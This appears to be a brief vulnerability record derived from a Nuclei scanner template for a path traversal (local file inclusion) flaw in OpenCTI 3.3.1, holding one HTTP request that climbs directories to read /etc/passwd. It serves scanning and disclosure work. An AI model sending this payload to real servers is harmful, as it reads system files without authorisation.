# Vulnerability: OpenCTI 3.3.1 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`opencti-lfi.yaml`)

## Description
OpenCTI 3.3.1 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/static/css//../../../../../../../../etc/passwd
```

